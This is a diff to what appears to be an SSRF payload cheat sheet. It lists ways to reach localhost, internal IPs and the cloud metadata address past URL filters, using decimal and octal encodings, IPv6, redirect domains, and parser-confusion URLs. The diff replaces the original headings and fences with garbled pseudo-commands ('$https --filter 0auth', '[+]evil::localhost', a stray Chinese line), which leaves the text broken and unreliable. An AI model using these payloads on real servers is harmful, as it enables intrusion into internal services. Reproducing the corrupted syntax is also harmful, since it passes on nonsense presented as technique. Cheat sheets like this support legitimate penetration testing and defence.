@@ -61,185 +61,109 @@
 - [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
 - [See-SURF - https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)
 - [SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff](https://github.com/teknogeek/ssrf-sheriff)
-
-## Payloads with localhost
-
-Basic SSRF v1
-
-```powershell
-http://127.0.0.1:80
-http://127.0.0.1:443
-http://127.0.0.1:22
-http://0.0.0.0:80
-http://0.0.0.0:443
-http://0.0.0.0:22
-```
-
-Basic SSRF - Alternative version
-
-```powershell
+#:root
+[+]evil::localhost
+[!]SSRF v1
+$upd
 http://localhost:80
 http://localhost:443
 http://localhost:22
-```
-
-## Bypassing filters
-
-### Bypass using HTTPS
-
-```powershell
+$https --filter 0auth
 https://127.0.0.1/
 https://localhost/
-```
-
-### Bypass localhost with [::]
-
-```powershell
+[+]evil::localhost[::]
 http://[::]:80/
 http://[::]:25/ SMTP
 http://[::]:22/ SSH
 http://[::]:3128/ Squid
-```
-
-```powershell
+<>
 http://0000::1:80/
 http://0000::1:25/ SMTP
 http://0000::1:22/ SSH
 http://0000::1:3128/ Squid
-```
-
-### Bypass localhost with a domain redirection
-
-```powershell
+$ 0auth evil::localhost xxx+++...redirection...
 http://spoofed.burpcollaborator.net
 http://localtest.me
 http://customer1.app.localhost.my.company.127.0.0.1.nip.io
 http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
 http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
-```
-
-The service nip.io is awesome for that, it will convert any ip address as a dns.
-
-```powershell
+没有搜索-查询有效载荷！？
+>>>import .srvc nip.io [!] --convert ["END","USER","ADDRESS"] --dns
+\
 NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
-```
-
-### Bypass localhost with CIDR 
-
-It's a /8
-
-```powershell
+# Bypass localhost with CIDR 
+/8
 http://127.127.127.127
 http://127.0.1.3
 http://127.0.0.0
-```
-
-### Bypass using a decimal IP location
-
-```powershell
+0auth.decimal\IP\location
 http://2130706433/ = http://127.0.0.1
 http://3232235521/ = http://192.168.0.1
 http://3232235777/ = http://192.168.1.1
 http://2852039166/  = http://169.254.169.254
-```
-
-### Bypass using octal IP
-
-Implementations differ on how to handle octal format of ipv4.
-
-```sh
+0auth.octal \IP.IMP --handle -format * ipv4
 http://0177.0.0.1/ = http://127.0.0.1
 http://o177.0.0.1/ = http://127.0.0.1
 http://0o177.0.0.1/ = http://127.0.0.1
 http://q177.0.0.1/ = http://127.0.0.1
-...
-```
-
-Ref: 
+Refferer: 
 - [DEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards & pwning IPv4 parsing](https://www.youtube.com/watch?v=_o1RPJAe4kU)
 - [AppSecEU15-Server_side_browsing_considered_harmful.pdf](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
-
-
-### Bypass using IPv6/IPv4 Address Embedding
-
+$0auth IPv6/IPv4 Address Embedding
 [IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)
-
 ```powershell
 http://[0:0:0:0:0:ffff:127.0.0.1]
 ```
-
-### Bypass using malformed urls
-
+$0auth mal-form_urls
 ```powershell
 localhost:+11211aaa
 localhost:00011211aaaa
 ```
-
-### Bypass using rare address
-
+# Bypass using rare address
 You can short-hand IP addresses by dropping the zeros
-
 ```powershell
 http://0/
 http://127.1
 http://127.0.1
 ```
-
 ### Bypass using URL encoding
-
 [Single or double encode a specific URL to bypass blacklist](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
-
 ```powershell
 http://127.0.0.1/%61dmin
 http://127.0.0.1/%2561dmin
 ```
-
 ### Bypass using bash variables 
-
 (curl only)
-
 ```powershell
 curl -v "http://evil$google.com"
 $google = ""
 ```
-
 ### Bypass using tricks combination
-
 ```powershell
 http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
 urllib2 : 1.1.1.1
 requests + browsers : 2.2.2.2
 urllib : 3.3.3.3
 ```
-
 ### Bypass using enclosed alphanumerics 
-
 [@EdOverflow](https://twitter.com/EdOverflow)
-
 ```powershell
 http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
-
 List:
 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
 ```
-
 ### Bypass filter_var() php function
-
 ```powershell
 0://evil.com:80;http://google.com:80/ 
 ```
-
 ### Bypass against a weak parser
-
 by Orange Tsai ([Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))
-
 ```powershell
 http://127.1.1.1:80\@127.2.2.2:80/
 http://127.1.1.1:80\@@127.2.2.2:80/
 http://127.1.1.1:80:\@@127.2.2.2:80/
 http://127.1.1.1:80#\@127.2.2.2:80/
 ```
-
 ![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
 
 ### Bypassing using a redirect
